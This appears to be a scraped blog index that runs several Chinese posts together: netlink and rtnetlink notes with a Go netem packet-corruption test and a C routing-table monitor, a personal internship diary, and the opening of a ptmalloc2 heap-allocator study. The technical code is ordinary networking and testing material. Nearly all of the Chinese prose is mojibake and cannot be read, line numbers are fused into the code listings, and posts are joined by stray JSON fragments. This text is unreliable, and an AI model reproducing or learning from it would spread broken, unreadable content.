12345#define NLM_F_REQUEST 1\t/* It is request message. */#define NLM_F_MULTI 2\t/* Multipart message, terminated by NLMSG_DONE */#define NLM_F_ACK 4\t/* Reply with ack, with zero or error code */#define NLM_F_ECHO 8\t/* Echo this request */#define NLM_F_DUMP_INTR 16\t/* Dump was inconsistent due to sequence change */ 0x15 netlink messages payloadæŒ‰ç…§ rfc é‡Œé¢çš„å®šä¹‰çš„æœåŠ¡æ¨¡å‹ï¼Œpayload éƒ¨åˆ†å°±æ˜¯åŸºäº netlink çš„å­åè®®çš„æ•°æ®ï¼Œå„ä¸ªå…·ä½“çš„å­åè®®ä¸åŒã€‚ 0x20 How to use netlink?0x21 in userspaceåœ¨ç”¨æˆ·æ€åº”ç”¨ä½¿ç”¨æ ‡å‡†çš„ socket ä¸å†…æ ¸é€šè®¯ï¼Œæ ‡å‡†çš„ socket API çš„å‡½æ•°ï¼Œsocket(), bind(), sendmsg(), recvmsg() å’Œ close() å¾ˆå®¹æ˜“åœ°åº”ç”¨åˆ° netlink socketã€‚ä¸ºäº†åˆ›å»ºä¸€ä¸ª netlink socketï¼Œç”¨æˆ·éœ€è¦ä½¿ç”¨å¦‚ä¸‹å‚æ•°è°ƒç”¨ socket(): socket(AF_NETLINK, SOCK_RAW, netlink_type) ç”¨æˆ·æ€æ›´å¤šçš„åº”ç”¨åœºæ™¯æ˜¯ä½¿ç”¨libnlåº“ è¿™é‡Œ. 0x22 kernelspacenetlink çš„å†…æ ¸å®ç°åœ¨net/netlink/af_netlink.cä¸­ï¼Œå†…æ ¸æ¨¡å—è¦æƒ³ä½¿ç”¨ netlink, ä¹Ÿå¿…é¡»åŒ…å«å¤´æ–‡ä»¶linux/netlink.h. å†…æ ¸ä½¿ç”¨ netlink éœ€è¦ä¸“é—¨çš„ API, è¿™å®Œå…¨ä¸åŒäºç”¨æˆ·æ€åº”ç”¨å¯¹ netlink çš„ä½¿ç”¨ã€‚å¦‚æœç”¨æˆ·éœ€è¦å¢åŠ æ–°çš„ netlink åè®®ç±»å‹ï¼Œå¿…é¡»é€šè¿‡ä¿®æ”¹linux/netlink.hæ¥å®ç°ï¼Œå½“ç„¶ï¼Œç›®å‰çš„ netlink å®ç°å·²ç»åŒ…å«äº†ä¸€ä¸ªé€šç”¨çš„åè®®ç±»å‹ NETLINK_GENERIC ä»¥æ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨ï¼Œç”¨æˆ·å¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒè€Œä¸å¿…å¢åŠ æ–°çš„åè®®ç±»å‹ã€‚ [^ibm1]: Linux ç³»ç»Ÿå†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´é€šä¿¡çš„å®ç°ä¸åˆ†æ[^ibm2]: åœ¨ Linux ä¸‹ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´æ•°æ®äº¤æ¢çš„æ–¹å¼[^lwn]: LWN","tags":["linux"]},{"title":"netlink route","path":"/2016/07/21/netlink-route/","content":"0x00 NETLINK_ROUTErtnetlinkåŸºäºnetlink, å®ƒå…è®¸ kernel çš„è·¯ç”±è¡¨è¢«è¯»æˆ–è€…ä¿®æ”¹ï¼Œå®ƒå¸¸è¢« kernel ç”¨æ¥å’Œå…¶ä»–çš„å­ç³»ç»Ÿçš„ç”¨æˆ·æ€ç¨‹åºé€šè®¯ã€‚ 0x01 introductionè™½ç„¶è¢«ç§°ä¸ºâ€Linux IPv4 routing socketâ€, ä¸è¿‡ç›®å‰è¿™ä¸ªprotocolå·²ç»æ”¯æŒäº†ipv6, è¿™ä¸ªç±»å‹protocolä¸»è¦æä¾›äº†ç½‘ç»œç›¸å…³çš„ä¿¡æ¯ã€‚å¯¹äºè¿™ä¸ªåè®®ï¼ŒLinux å£°æ˜äº†å¤§é‡çš„å­æ¶ˆæ¯ï¼Œæ›´å¤šçš„ä¿¡æ¯å¯ä»¥å‚è€ƒ manual[^tcwiki]: åç§° æ¶ˆæ¯ç±»å‹ é“¾è·¯å±‚ RTM_NEWLINK, RTM_DELLINK, RTM_GETLINK, RTM_SETLINK åœ°å€è®¾å®š RTM_NEWADDR, RTM_DELADDR, RTM_GETADDR è·¯ç”±è¡¨ RTM_NEWROUTE, RTM_DELROUTE, RTM_GETROUTE é‚»å±…ç¼“å­˜ TM_NEWNEIGH, RTM_DELNEIGH, RTM_GETNEIGH è·¯ç”±è§„åˆ™ RTM_NEWRULE, RTM_DELRULE, RTM_GETRULE Queuing Discipline Settings RTM_NEWQDISC, RTM_DELQDISC, RTM_GETQDISC Traffic Classes used with Queues RTM_NEWTCLASS, RTM_DELTCLASS, RTM_GETTCLASS æµé‡è¿‡æ»¤ RTM_NEWTFILTER, RTM_DELTFILTER, RTM_GETTFILTER å…¶å®ƒ RTM_NEWACTION, RTM_DELACTION, RTM_GETACTION, RTM_NEWPREFIX, RTM_GETPREFIX, RTM_GETMULTICAST, RTM_GETANYCAST, RTM_NEWNEIGHTBL,RTM_GETNEIGHTBL, RTM_SETNEIGHTBL 0x02 Network Route Service Module^rfcè¿™ä¸ªæœåŠ¡æä¾›äº†ç½‘ç»œè·¯ç”±çš„åˆ›å»ºï¼Œç§»é™¤ä¸æ¥æ”¶ç½‘ç»œè·¯ç”±ï¼Œè¿™ä¸ªæœåŠ¡çš„messagesæ¨¡æ¿å¦‚ä¸‹ï¼Œå­—æ®µçš„æ›´å¤šä¿¡æ¯å‚è€ƒRFC3549çš„ 3.1.1. 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Family | Src length | Dest length | TOS | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Table ID | Protocol | Scope | Type | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Flags | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ 0x03 Neighbor Setup Service Moduleè¿™ä¸ªæœåŠ¡æä¾›å¢åŠ ï¼Œç§»é™¤å’Œæ¥å—é‚»å±…ä¿¡æ¯çš„èƒ½åŠ›ï¼Œè¿™ä¸ªæœåŠ¡messagesæ¨¡æ¿å¦‚ä¸‹ï¼Œå­—æ®µçš„æ›´å¤šä¿¡æ¯å‚è€ƒRFC3549çš„ 3.1.2. 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Family | Reserved1 | Reserved2 | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Interface Index | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | State | Flags | Type | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ 0x03 Traffic Control Serviceè¿™ä¸ªæœåŠ¡æä¾›äº†ä¾›ç»™ï¼ŒæŸ¥è¯¢ä¸ä¾¦å¬æ”¯æŒæµé‡æ§åˆ¶äº‹ä»¶çš„èƒ½åŠ›ï¼Œlinux ä¸‹é¢æµé‡æ§åˆ¶æ˜¯éå¸¸å…·æœ‰å¼¹æ€§ (å¤æ‚), å­—æ®µçš„æ›´å¤šä¿¡æ¯å‚è€ƒRFC3549çš„ 3.1.3. 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Family | Reserved1 | Reserved2 | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Interface Index | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Qdisc handle | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | Parent Qdisc | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ | TCM Info | +-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-+ 0x20 demo API to the configuration interfaces of the NETLINK_ROUTE family including network interfaces, routes, addresses, neighbours, and traffic control. å¼•ç”¨åœ¨libnl-routeä»‹ç»ï¼Œå¯¹ç…§ RFC å®šä¹‰çš„ip serviceéƒ¨åˆ†è¿˜æ˜¯éƒ½æ”¯æŒçš„ï¼Œç€ä¹Ÿæ˜¯ä¸»æµçš„NETLINK_ROUTEçš„ä½¿ç”¨é€”å¾„ã€‚ 0x21 emulateing wide networkvishvanandaå°è£…äº†golangçš„netlinkçš„åº“ï¼Œå¯ä»¥åšip serviceä¸­traffic controlçš„äº‹æƒ…ï¼Œæ¯”å¦‚å»æ¨¡æ‹Ÿå¹¿åŸŸç½‘ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091package mainimport ( &quot;fmt&quot; &quot;github.com/vishvananda/netlink&quot; &quot;os/exec&quot; )func main() &#123; // æ¯åæµ‹è¯• fmt.Println(&quot; åŒ…æ¯åæµ‹è¯•&quot;) NetCorruption(20) check_interface_status() StopNetCorruption() check_interface_status()&#125;// æ£€æŸ¥çŠ¶æ€func check_interface_status() &#123; output, err := exec.Command(&quot;/sbin/tc&quot;, &quot;qdisc&quot;).Output() if err != nil &#123; fmt.Println(&quot;error in cmd.start()&quot;) &#125; fmt.Printf(&quot;%v&quot;, string(output))&#125;// è·å¾—ç½‘å¡çš„ Indexfunc get_interface_list() []int &#123; interfaces, _ := netlink.LinkList() var interface_index []int for _, name := range interfaces[1:] &#123; interface_index = append(interface_index, name.Attrs().Index) &#125; return interface_index&#125;// æ„é€ å‡ºæ¯ç½‘å¡ qdisc å±æ€§ï¼Œç±»ä¼¼ dev inferface_name root netemfunc constructor_qdiscattrs() []netlink.QdiscAttrs &#123; linkindexs := get_interface_list() var netems []netlink.QdiscAttrs for _, indexs := range linkindexs &#123; var qdisc_attrs = netlink.QdiscAttrs&#123; Parent: netlink.HANDLE_ROOT, LinkIndex: indexs, &#125; netems = append(netems, qdisc_attrs) &#125; return netems&#125;// å…·ä½“çš„ do æ‰§è¡Œfunc traffic_control(nattrs netlink.NetemQdiscAttrs) error &#123; var netems = constructor_qdiscattrs() for _, netem := range netems &#123; err := netlink.QdiscAdd(netlink.NewNetem(netem, nattrs)) if err != nil &#123; fmt.Printf(&quot;traffic_control %v &quot;, err) return err &#125; &#125; return nil&#125;// å…·ä½“çš„ undo æ‰§è¡Œfunc undo_traffic_control() error &#123; fmt.Println(&quot;undo operation&quot;) links, _ := netlink.LinkList() for _, link := range links &#123; netems, _ := netlink.QdiscList(link) for _, netem := range netems &#123; err := netlink.QdiscDel(netem) if err != nil &#123; fmt.Printf(&quot;undo_traffic_control %v &quot;, err) return err &#125; &#125; &#125; return nil&#125;// å®å‚å•ä½æ˜¯ %, ä¾‹å¦‚å®å‚æ˜¯ 80, è¡¨ç¤ºæŸåç‡ 80%func NetCorruption(precents float32) &#123; var nattrs netlink.NetemQdiscAttrs nattrs.CorruptProb = precents traffic_control(nattrs)&#125;func StopNetCorruption() &#123; undo_traffic_control()&#125; 0x21 monitor routing tableå½“ç„¶å¯ä»¥ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„rtnetlink.hæ¥ç›‘æ§è·¯ç”±è¡¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include &lt;sys/socket.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;linux/netlink.h&gt;#include &lt;linux/rtnetlink.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#define ERR_RET(x) do &#123; perror(x); return EXIT_FAILURE; &#125; while (0);#define BUFFER_SIZE 4095int loop (int sock, struct sockaddr_nl *addr)&#123; int received_bytes = 0; struct nlmsghdr *nlh; char destination_address[32]; char gateway_address[32]; struct rtmsg *route_entry; /* This struct represent a route entry in the routing table */ struct rtattr *route_attribute; /* This struct contain route attributes (route type) */ int route_attribute_len = 0; char buffer[BUFFER_SIZE]; bzero(destination_address, sizeof(destination_address)); bzero(gateway_address, sizeof(gateway_address)); bzero(buffer, sizeof(buffer)); /* Receiving netlink socket data */ while (1) &#123; received_bytes = recv(sock, buffer, sizeof(buffer), 0); if (received_bytes &lt; 0) ERR_RET(&quot;recv&quot;); /* cast the received buffer */ nlh = (struct nlmsghdr *) buffer; /* If we received all data ---&gt; break */ if (nlh-&gt;nlmsg_type == NLMSG_DONE) break; /* We are just intrested in Routing information */ if (addr-&gt;nl_groups == RTMGRP_IPV4_ROUTE) break; &#125;/* Reading netlink socket data *//* Loop through all entries *//* For more informations on some functions : * http://www.kernel.org/doc/man-pages/online/pages/man3/netlink.3.html * http://www.kernel.org/doc/man-pages/online/pages/man7/rtnetlink.7.html */for ( ; NLMSG_OK(nlh, received_bytes); nlh = NLMSG_NEXT(nlh, received_bytes))&#123; /* Get the route data */ route_entry = (struct rtmsg *) NLMSG_DATA(nlh); /* We are just intrested in main routing table */ if (route_entry-&gt;rtm_table != RT_TABLE_MAIN) continue; /* Get attributes of route_entry */ route_attribute = (struct rtattr *) RTM_RTA(route_entry); /* Get the route atttibutes len */ route_attribute_len = RTM_PAYLOAD(nlh); /* Loop through all attributes */ for ( ; RTA_OK(route_attribute, route_attribute_len); route_attribute = RTA_NEXT(route_attribute, route_attribute_len)) &#123; /* Get the destination address */ if (route_attribute-&gt;rta_type == RTA_DST) &#123; inet_ntop(AF_INET, RTA_DATA(route_attribute), destination_address, sizeof(destination_address)); &#125; /* Get the gateway (Next hop) */ if (route_attribute-&gt;rta_type == RTA_GATEWAY) &#123; inet_ntop(AF_INET, RTA_DATA(route_attribute), gateway_address, sizeof(gateway_address)); &#125; &#125; /* Now we can dump the routing attributes */ if (nlh-&gt;nlmsg_type == RTM_DELROUTE) fprintf(stdout, &quot;Deleting route to destination --&gt; %s and gateway %s &quot;, destination_address, gateway_address); if (nlh-&gt;nlmsg_type == RTM_NEWROUTE) printf(&quot;Adding route to destination --&gt; %s and gateway %s &quot;, destination_address, gateway_address);&#125; return 0;&#125;int main(int argc, char **argv)&#123; int sock = -1; struct sockaddr_nl addr; /* Zeroing addr */ bzero (&amp;addr, sizeof(addr)); if ((sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)) &lt; 0) ERR_RET(&quot;socket&quot;); addr.nl_family = AF_NETLINK; addr.nl_groups = RTMGRP_IPV4_ROUTE; if (bind(sock,(struct sockaddr *)&amp;addr,sizeof(addr)) &lt; 0) ERR_RET(&quot;bind&quot;); while (1) loop (sock, &amp;addr); /* Close socket */ close(sock); return 0;&#125; å¯ä»¥é€šè¿‡ä¸‹é¢å‚æ•°çœ‹è§ï¼š 1234# route add -host 10.113.0.0 gw localhostAdding route to destination --&gt; 10.113.0.0 and gateway 127.0.0.1# route del -host 10.113.0.0 gw localhostDeleting route to destination --&gt; 10.113.0.0 and gateway 127.0.0.1 [^tcwiki]: wikipedia TC","tags":["linux"]},{"title":"internship in Beijing","path":"/2016/06/30/intern-in-beijing/","content":"è‡ªå—äº¬åˆ°åŒ—äº¬ã€‚å‘ç°åŒ—æ–¹çš„å†·å’Œå—æ–¹çš„å†·ä¸åŒï¼Œå—æ–¹çš„å†·æ˜¯ä¾µå…¥å¼çš„æ¹¿å†·åƒä¸ªå°å¦–ç²¾æ…¢æ…¢æŠŠä½ è…èš€ï¼ŒåŒ—æ–¹çš„å†·å¹²ç‡¥åƒä¸ªæš´èºçš„æ±‰å­æ¥çš„çŒ›çƒˆå¦‚ç‹‚é£å·å¸­ã€‚ å¥‘æœºã®æ—§éƒ½å­¦æ ¡çš„ç”Ÿæ´»æ—¢æ— èŠåˆæ— èŠï¼Œæ¯å¤©æŒ‰æ—¶ä¸Šä¸‹è¯¾ï¼Œè‡ªå·±çœ‹çœ‹ä¹¦ç©ç©ä»£ç ï¼Œæ— èŠä¸­æƒ³æ‰¾ç‚¹å˜åŒ–ï¼Œå°±æœ‰äº†æ‰¾ä»½å®ä¹ æ„Ÿå—ä¸€ä¸‹èŒåœºçš„å¿µå¤´ã€‚15 å¹´ 11 æœˆå·¦å³ï¼Œçº¦äº†å—é‚®å¤§è¡¨å“¥æ¥çœ‹å¦¹å­ï¼Œå’Œä»–è®²åˆ°å­¦æ ¡çš„ç”Ÿæ´»å’Œè‡ªå·±çš„æƒ³æ³•ï¼Œé‚è¢«è¦å»äº†ç®€å†ï¼Œå†…æ¨é¢è¯•é€šè¿‡äº†ï¼Œè·å¾—è¿›å…¥äº†çº¢å‚å®ä¹ çš„æœºä¼šï¼Œæ‹¿åˆ° offer çš„æ—¶è¿˜æ˜¯è›®éœ‡æƒŠçš„ï¼Œå±…ç„¶èƒ½é¢è¿‡çº¢å¸½ã€‚ äº¬åŸã®è¯•ç‚¼åˆè®¿éƒ½åŸ2015 å¹´ 12 æœˆ 22 æ—©ä¸Š 9 ç‚¹ 30 å·¦å³åˆ°çš„åŒ—äº¬äº”é“å£åœ°é“ç«™ï¼Œæ‹–ç€è¡Œæç®±èµ°åˆ°åœ°é“ç«™å¤–ï¼ŒåŒ—æ–¹çœŸçš„å¥½å†·ï¼ç”µè¯è”ç³»äº†äºŒæˆ¿ä¸œï¼Œæ‰¾åˆ°äº†é©¬ä¸Šè¦ä½çš„å®¿èˆï¼Œå¾ˆå°ä¹Ÿå¾ˆç ´ï¼Œè½å·®æ„Ÿéš¾å…ï¼Œä¸è¿‡ä¹Ÿæ˜¯é‚£æ—¶å€™ç¬¬ä¸€æ¬¡æ„Ÿå—åˆ°äº†åŒ—æ–¹çš„æš–æ°”çœŸæ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚å½“å¤©ä¸‹åˆ 2 ç‚¹å·¦å³è·‘å»äº†å…¬å¸æƒ³çœ‹ä¸€ä¸‹ï¼Œèµ°åœ¨è·¯ä¸Šå¤–é¢çœŸå†·ï¼Œèç§‘ C å¤–é¢ç«‹ç€ VMware çš„ç‰Œå­ï¼Œåœ¨æƒ³æƒ³å—äº¬ç«‹åˆ¤é«˜ä¸‹ï¼Œä¸€æƒ³ä»¥åè¦åœ¨è¿™é‡Œä¸Šç­å¯¹ä½å¤„çš„å¤±æœ›æš‚æ—¶å¿˜å´äº†ã€‚è¿›äº†å…¬å¸æ‰å‘ç°ä¸èƒ½æå‰å…¥èŒï¼Œä¸è¿‡è¿˜æ˜¯è§åˆ°äº† Team leader, è€Œåå»äº†å®œå®¶ä¹°äº†ä¸€å †åºŠä¸Šç”¨å“ï¼Œè§„åˆ’æ¥ä¸‹æ¥ä¸¤å¤©çš„ç©æ³•.(å˜¿å˜¿å˜¿) å›½å®¶å›¾ä¹¦é¦† åœ£è¯èŠ‚æ˜¨å¤©ï¼Œåˆ°äº†å·¥ä½ï¼Œé¢†äº†è®¾å¤‡å’ŒåŠå…¬ç”¨å“ã€‚ç¯é¡¾å‘¨å›´ï¼Œæ„Ÿå—åˆ°å·¥ç¨‹å¸ˆå¯¹ç¾å¾—æ¬£èµå¤§æŠµä¸Šæ˜¯ç›¸åŒçš„ï¼šé»‘è‰²æœ‰æ£±è§’çš„è®¾è®¡ï¼Œå†·è‰²çš„ç»ˆç«¯é…è‰²ï¼Œcodeing æ—¶å€™å¬ç€ douban.fm ç­‰ç­‰ã€‚åœ¨ä¸€è¯´ä»Šå¤©æ˜¯åœ£è¯èŠ‚ï¼Œå›æƒ³æˆ‘åœ¨ä¸Šå¤§å­¦ä¹‹å‰æ˜¯æ²¡æœ‰åœ£è¯èŠ‚çš„ï¼Œä¸Šäº†å¤§å­¦è¿‡åå‘ç°åŒå­¦ä»¬è¿‡åœ£è¯èŠ‚æˆ‘æ‰æ„Ÿå—åˆ°æ´‹èŠ‚æ—¥çš„æ°”æ°›ï¼Œå¾€å¹´çš„ä»Šå¤©æˆ‘æ€»æ˜¯èƒ½æ”¶åˆ°è‹¹æœä¹‹ç±»çš„ï¼Œä½†æ˜¯ä»Šå¹´ä¸åœ¨éš¾å…æœ‰ç‚¹æ€€å¿µå¤§å­¦æ—¶å…‰ã€‚å¯èƒ½è¿™å°±æ˜¯å›´åŸã€‚è™½ç„¶å…¬å¸æä¾›äº†å¾ˆä¸é”™çš„åœ£è¯æ—©é¤ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸å¦‚åœ¨å­¦æ ¡æ¥çš„å¥½ç©å‘¢ã€‚ åœ£è¯èŠ‚ Teamä½œä¸ºä¸€ä¸ªå¼€æºè½¯ä»¶å…¬å¸ï¼Œå®ƒçš„ç¤¾åŒºæ°”æ°›å¾ˆæµ“ï¼Œåˆ°å¤„å¯è§ç¤¾åŒºçš„å°ç©æ„ï¼Œå½“ç„¶å…¬å¸æœ¬èº«ä¹Ÿæ˜¯é›‡äº†ç¤¾åŒºçš„äººã€‚åŒäº‹ä»¬çš„æŠ€æœ¯èƒ½åŠ›ä¹Ÿå¾ˆå‰å®³ï¼Œå·æ‹åŒäº‹æ˜¾ç¤ºå™¨å¯ä»¥çœ‹åˆ°å¯†å¯†éº»éº»çš„å°ç»ˆç«¯ï¼Œè¿™æ ·çš„ä¸œè¥¿æˆ‘çš„çœ¼ç›æ˜¯å¤„ç†ä¸è¿‡æ¥çš„å“ˆã€‚ team å¤§å®¶ä¸Šç­å¹¸ç¦æ„Ÿå¾ˆé«˜ (ä¸Šå›¾ä¸ºè¯), å¾ˆå¥½ç©çš„ä¸€ä¸ª team, å½“ç„¶ä»–ä»¬çš„èŒä¸šæ°´å¹³ä¹Ÿå¾ˆå‰å®³ï¼Œè€Œæˆ‘æ˜¯èœé¸Ÿï¼Œèƒ½å’Œä»–ä»¬ä¸€èµ·å·¥ä½œçœŸæ˜¯å¹¸è¿ï¼ å·¥ä½œæˆ‘çš„ title æ˜¯ intern, æ„Ÿè§‰å¥½ç¬¼ç»Ÿå“¦ï¼Œä¸»è¦ä»»åŠ¡å­¦ä¹  kernel, åšä¸€äº› nfs bug æµ‹è¯•ä¹‹ç±»çš„äº‹æƒ…ã€‚mentor æ˜¯ jh å’Œ yc, ä¸¤ä½å¯Œæœ‰ç»éªŒçš„å·¥ç¨‹å¸ˆè®©æˆ‘çŸ¥é“äº†rhel kernelçš„å¼€å‘æµç¨‹å’Œ bug çš„ç”Ÿå‘½å‘¨æœŸã€‚jh ä¹‹å‰åœ¨ hw åšäº†å¤šå¹´ç ”å‘ï¼Œæ‰å®çš„ä¸“ä¸šèƒŒæ™¯çŸ¥è¯†å’Œå¯¹ç³»ç»Ÿç¼–ç¨‹çš„ç†è§£è®©æˆ‘è¿™ä¸ªæ›¾ç»ç‹‚å¦„çš„å°èœé¡¿æ„Ÿç¾æ„§ã€‚yc æ˜¯æ˜¯å‰ sun çš„é›‡å‘˜ï¼Œåƒä¸ªçƒ­æƒ…çš„å¤§å“¥ï¼Œæˆ‘å®ä¹ ç”Ÿå‘¨æœ«è¿›ä¸äº†å…¬å¸ï¼Œä»–æŠŠè‡ªå·±çš„å¡å€Ÿæˆ‘ï¼Œå¯¹æˆ‘ä¿¡ä»»å’Œæ— ç§å¸®åŠ©è®©è¿™ä¸ªå°åŒ—æ¼‚æ„Ÿåˆ°äº†å…³æ€€ (å˜¿å˜¿å˜¿). gongwei ç”Ÿæ´»å› ä¸ºå›¾è¿‘ï¼Œæ‰€ä»¥åœ¨å­¦æ ¡æ—¶å€™å°±å®‰æ’å¥½äº†ä½å¤„ â€“ äº”é“å£é™„è¿‘åºŠä½ï¼Œè¿˜æ˜¯è¦æ„Ÿè°¢å¤§è¡¨å“¥å¸®æˆ‘çº¿ä¸‹ç¡®è®¤ï¼Œå…¥ä½è¿‡åå‘ç°å¾ˆå¤šå‰å®³çš„äººåœ¨åŒ—äº¬å’Œæˆ‘ä¸€æ ·å› ä¸ºæ²¡æœ‰è¶³å¤Ÿçš„é¢„ç®—è€Œé€‰åºŠä½ã€‚å°è±¡æ¯”è¾ƒæ·±çš„æ˜¯ï¼šä¸­ç§‘å¤§çš„ç ”ç©¶ç”Ÿ (åˆå‡ºå¤œå½’), æ¸…åç›´åšçš„å¾®è½¯å®ä¹ ç”Ÿï¼Œå“ˆå·¥å¤§åœ¨èƒ½åŠ¨æ‰€å®ä¹ çš„ç ”ç©¶ç”Ÿå’Œä»–ä¸€èµ·çš„å¤©å¤§åŒ–å­¦ç ”ç©¶ç”ŸåŒå­¦ï¼ŒæŠ¥è€ƒåŒ—å¤§å“²å­¦åšå£«çš„å—æ–¹äººï¼Œè‹ç§‘é™¢å­¦å»ºç­‘çš„å°ä¼™; é‚£ä¹ˆå¤šä¼˜ç§€äººåœ¨åŒ—äº¬å’Œæˆ‘æŒ¤åœ¨ä¸€èµ·ä¸çŸ¥é“æ˜¯éš¾è¿‡è¿˜æ˜¯å¼€å¿ƒã€‚è¿™æ®µç”Ÿæ´»ç»å†è®©æˆ‘ä½“ä¼šåˆ°åŒ—æ¼‚è¿™ä¸ªè¯æ›´å¤šå«ä¹‰ï¼šç²¾ç¥ä¸Šçš„å­¤ç‹¬ï¼Œç‰©è´¨ä¸Šçš„è´«ä¹ï¼Œä¸è¿‡æœ‰çš„æ˜¯å¯¹æœªæ¥çš„ä¿¡å¿ƒã€‚ åŒ—å››ç¯çš„éœ¾ ç¦»èŒ2016 å¹´ 6 æœˆ 29 æ—¥ï¼Œä¸€å¼ å•ç¨‹ç¥¨é€èµ°æˆ‘ç¬¬ä¸€æ¬¡å®ä¹ ç»å†ã€‚è¿”ç¨‹çš„è·¯ä¸Šï¼Œæ•´ç†äº†æƒ³æ³•ï¼Œå¯¹è¿‡å»çš„æ€»ç»“ï¼Œçœ¼ä¸‹çš„ä¸è¶³ï¼Œæœªæ¥çš„å±•æœ›ã€‚ å•ç¨‹ç¥¨ 28 æ™šä¸Šè‡ªå—äº¬å‡ºå‘ï¼Œ29 å·ç­¾å®Œæ‰‹ç»­å°±æ’¤é€€å‡†å¤‡æœŸæœ«è€ƒï¼Œæœ‰ç‚¹æ€¥äº†ã€‚åˆ°äº†å­¦æ ¡ï¼Œè¿”ç¨‹è·¯ä¸Šçš„æƒ³æ³•è¢«æ‰¯ç¢äº†ï¼Œä»¿ä½›å›åˆ°äº†åŸç‚¹ï¼Œåˆæ˜¯å‡ å¤©åºŸæˆ‘é’æ˜¥çš„ç”Ÿæ´»ã€‚ å°¾è¦è°¢è°¢åŒäº‹çš„å…³ç…§ï¼Œç¥å„ä½å·¥ä½œé¡ºåˆ©ï¼Œæœ‰ç¼˜å†è§ã€‚","tags":["life"]},{"title":"ptmalloc2","path":"/2016/06/14/ptmalloc2/","content":"0x00 introductionè¿™ç¯‡æ˜¯å¯¹ç¬”è®°æ˜¯å¯¹ [^Understanding] å­¦ä¹ çš„è®°å½•ï¼Œéœ€è¦é¢„å¤‡çŸ¥è¯† [^layout], å…¶ä½™ [^freebuf1] ä¸ [^freebuf2] æ˜¯é˜¿é‡Œäººå¯¹ä»–çš„ç¿»è¯‘æ•´ç†è¡¥å……ï¼ŒåŒæ—¶ç»™æ­£ç»çš„å¼€å‘äººå‘˜è£‚å¢™å®‰åˆ© [^source].å­¦ä¹ è¿™ä¸ªä¸»è¦ç›®çš„æ˜¯æŒæ¡å †è¿ä½œçš„åŸºæœ¬æµç¨‹ä¸å¯èƒ½å­˜åœ¨çš„é—®é¢˜ã€‚è¿™ä¸ªå¯ä»¥ä¸ºå †å®‰å…¨é—®é¢˜ (double free, unlink, use-after-free etc) å­¦ä¹ ä¸åˆ†ææä¾›åŸºç¡€ã€‚å…¶æ¬¡æ˜¯å°è¯•æ€»ç»“å‡ºä¸€ä¸ªç›¸å¯¹ä¸€è‡´çš„å†…å­˜ç®¡ç†æ¨¡å‹ (è¿™ä¸ªæƒ³æ³•æ¥è‡ªäºç»„å†…çš„ä¸€æ¬¡åˆ†äº«:The GC of JAVA). ç›®å‰ C è¯­è¨€ä¸»è¦å‡ ç§å †ç®¡ç†æœºåˆ¶æ˜¯ï¼š dlmalloc - General purpose allocator ptmalloc2 - Glibc jemalloc - freebsd and firefox tcmalloc - Google libumem - Solaris åœ¨ linux ç³»ç»Ÿä¸Šmem_strcut-&gt;start_brkä¸mm_struct-&gt;brkåˆ†åˆ«é™å®šäº†å †çš„èµ·æ­¢åœ°å€ï¼Œè¿›ç¨‹å¯é€šè¿‡malloc,calloc,realloc,free,brkä¸sbrkæ¥è¯·æ±‚ä¸é‡Šæ”¾ heap.å…¶ä¸­åªæœ‰brkæ˜¯å”¯ä¸€çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ä½™çš„éƒ½æ˜¯åŸºäºbrkæˆ–mmapè°ƒç”¨å®ç°çš„ã€‚ brk: 